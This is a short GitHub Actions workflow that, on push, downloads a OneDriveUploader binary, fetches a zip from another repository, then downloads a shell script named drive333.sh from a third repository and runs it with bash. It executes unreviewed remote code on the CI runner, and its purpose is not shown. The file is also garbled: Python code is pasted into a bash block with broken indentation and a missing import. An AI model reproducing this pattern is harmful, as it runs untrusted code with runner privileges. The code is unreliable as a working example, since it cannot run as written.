name: sixuu
on: [push, workflow_dispatch]
jobs:
  download-and-run:
    runs-on: ubuntu-latest
    steps:
      - name: Download file
        run: |
          wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
          chmod +x /usr/local/bin/OneDriveUploader
          
          
          import zipfile
          import requests
          url = 'https://github.com/tuhvvvvvy/0127/blob/5deeeb8bed8c8e8879947d9b4917c8cc53ef8f66/.github/workflows/230117.zip'
          response = requests.get(url)
          with zipfile.ZipFile(BytesIO(response.content), 'r') as zip_ref:
          zip_ref.extractall()
          wget -O drive333.sh https://raw.githubusercontent.com/hongtyyu/0127/main/.github/workflows/drive333.sh
          bash drive333.sh
